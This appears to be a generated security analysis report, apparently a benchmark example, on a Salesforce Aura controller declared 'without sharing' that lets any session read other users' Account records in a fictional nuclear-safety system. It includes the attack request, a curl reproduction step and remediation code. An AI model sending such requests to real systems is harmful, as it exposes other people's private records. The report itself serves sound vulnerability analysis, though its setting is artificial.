# Security Analysis Report
**System:** ReactorCore Safety API (Salesforce-Integrated) — v1.6.0 (FINAL)
**Domain:** Nuclear / Safety Systems
**Example ID:** SF-0040
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `AccountController.getAccounts` — attacker reads any Account record including nuclear safety personnel data |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Account Object (Pattern 3.1)

### Summary
The Apex controller `AccountController` on ReactorCore Safety API (`193a22f6.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Account object. Per §5.0 Pattern 3.1, the design incorrectly assumes the client will only supply IDs the user is authorised to access — no server-side ownership enforcement exists. An attacker with a valid session supplies any `accountId` in the Aura `POST /aura` payload and retrieves Account records belonging to other users. In a nuclear / safety systems context, Account records may contain safety inspector credentials, reactor site vendor data, and compliance personnel PII.

**Context artifact note:** §4.0 defines the Apex method as `getAccountDetails`, while §5.0 and the HAR descriptor (§6.0) reference `c.AccountController.getAccounts`. Both reference `AccountController` without sharing, and the root cause is identical; the inconsistency is documented as-is.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://193a22f6.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://193a22f6.lightning.force.com/aura
Authorization: Bearer 00D193A22F6!AR193a22f6...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D193A22F6!AR193a22f6...

message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN",
"params":{"accountId":"00122F6","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Account Record Returned**
```json
{
  "actions": [
    {
      "id": "1;a",
      "state": "SUCCESS",
      "returnValue": {
        "records": [
          {
            "Id": "00122F6",
            "Name": "Victim Account Record",
            "OwnerId": "005VICTIM",
            "InternalNotes__c": "CONFIDENTIAL: internal review notes",
            "SensitiveData__c": "SSN: 000-14-5377"
          }
        ]
      },
      "error": []
    }
  ]
}
```

### Evidence Map

| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 3.1 | Client-assumed authority | Classification | Server trusts client to self-restrict to authorised IDs |
| §7.0 OWD | Account: Private | Sharing config | Only record owner should have access |
| §8.0 RISK-SF-040 | No `with sharing` | Risk code | Sharing rules not enforced |
| §8.0 RISK-SF-041 | No ownership predicate | Risk code | Any `accountId` accepted |
| HAR descriptor | `c.AccountController.getAccounts` | Entry point | |
| HAR params | `accountId` | `00122F6` | Victim Account record ID |
| HAR params | `fields` | Full sensitive list | `InternalNotes__c`, `SensitiveData__c` |
| HAR response | `OwnerId` | `005VICTIM` | Differs from attacker's session |
| HAR response | `SensitiveData__c` | `SSN: 000-14-5377` | Nuclear facility personnel PII |

### Steps to Reproduce

```bash
# Step 1 — Authenticate with a valid Salesforce session on 193a22f6.lightning.force.com
SESSION="00D193A22F6!AR193a22f6..."

# Step 2 — Submit Aura action with victim accountId
curl -s -X POST "https://193a22f6.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"00122F6","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'

# Expected (vulnerable): state: "SUCCESS", OwnerId: "005VICTIM", SensitiveData__c: "SSN: 000-14-5377"
# Expected (secure): state: "ERROR" or empty records — INSUFFICIENT_ACCESS
```

### Remediation

1. **Declare controller `with sharing`:**
   ```apex
   public with sharing class AccountController { ... }
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   WHERE Id = :accountId AND OwnerId = :UserInfo.getUserId()
   ```
   plus `WITH SECURITY_ENFORCED`
3. **Validate `accountId`** against the session user's accessible record set before executing the query.
4. **Remove client-controlled `fields` parameter** — define a server-side allowlist for Account fields.
5. **Validate `aura.token`** — the submitted value `undefined` indicates token validation is absent.
6. **Nuclear / safety note:** Account records linked to nuclear facility operations, safety inspector assignments, or vendor access may represent nuclear security information. UK ONR and IAEA safeguards data protection obligations apply; exposure of `SensitiveData__c` with personnel SSN (`000-14-5377`) constitutes a direct regulatory breach.
